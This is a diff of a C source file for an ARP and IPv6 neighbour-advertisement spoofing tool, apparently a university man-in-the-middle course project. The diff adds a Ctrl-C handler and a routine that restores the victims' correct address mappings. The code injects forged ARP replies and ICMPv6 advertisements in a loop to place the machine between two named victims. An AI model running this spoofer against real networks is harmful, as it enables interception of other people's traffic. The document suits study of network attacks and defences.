@@ -1,15 +1,7 @@
 //VUTBR - FIT - PDS project MitM
 //Author: Jan Kubis / xkubis13
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
+#include <signal.h>
 #include <ctype.h>
-
-#include <arpa/inet.h>
-#include <net/if.h>
-#include <net/ethernet.h>
-#include <linux/if_ether.h> // ETH_P_ARP = 0x0806
 
 #include "pds_addr.h"
 #include "pds_pkt.h"
@@ -30,8 +22,12 @@ typedef struct {
 #define ARG_IPV6_TYPE 2
 int arg_ip_type = 0;
 
-void printHelp(){
-	printf("Usage: pds-spoof ...\n");
+
+volatile bool sigint_recv = false;
+void sigint_callback(int signo){
+	UNUSED(signo);
+	sigint_recv = true;
+	printf("SIGINT received, wait to finish..\n");
 }
 
 int parseArgs(int argc, char* argv[], clargs_t *clargs){
@@ -102,15 +98,14 @@ int parseArgs(int argc, char* argv[], clargs_t *clargs){
 
 void spoof(iface_t iface, clargs_t clargs){
 	
-	int bytes_written=0;
 	while(true){
 		if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
 			uint8_t pkt1[PKT_ARP_LEN];
 			arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
 			uint8_t pkt2[PKT_ARP_LEN];
 			arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,iface.mac,clargs.vic2_mac,ARP_OP_REPLY);
-			bytes_written =pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
-			bytes_written =pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
+			pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
+			pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
 			
 		}
 		else{ //IPV6
@@ -118,22 +113,43 @@ void spoof(iface_t iface, clargs_t clargs){
 			icmpv6_pkt_advert_build(pkt1,iface.mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
 			uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
 			icmpv6_pkt_advert_build(pkt2,iface.mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
-			bytes_written = pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
-			bytes_written = pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
+			pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
+			pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
 		}
 
+		if(sigint_recv){break;}
 		usleep(clargs.interval_ms*1000);
 	}
 
 	return;
 }
 
+void unspoof(iface_t iface, clargs_t clargs){
+	if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
+		uint8_t pkt1[PKT_ARP_LEN];
+		arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,clargs.vic2_mac,clargs.vic1_mac,ARP_OP_REPLY);
+		uint8_t pkt2[PKT_ARP_LEN];
+		arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,clargs.vic1_mac,clargs.vic2_mac,ARP_OP_REPLY);
+		pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
+		pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
+	}
+	else{ //IPV6
+		uint8_t pkt1[PKT_ICMPV6_ADVERT_LEN];
+		icmpv6_pkt_advert_build(pkt1,clargs.vic1_mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
+		uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
+		icmpv6_pkt_advert_build(pkt2,clargs.vic2_mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
+		pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
+		pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
+	}
+}
+
 int main(int argc, char* argv[]){
+	
 	clargs_t clargs;
 	iface_t iface;
-
+	signal(SIGINT, sigint_callback);
+	
 	if((parseArgs(argc,argv,&clargs))!=0){
-		printHelp();
 		return 0;
 	}
 
@@ -147,6 +163,7 @@ int main(int argc, char* argv[]){
 	pcap_activate(iface.handle);
 
 	spoof(iface,clargs);
+	unspoof(iface,clargs);
 
 	pcap_close(iface.handle);
 }
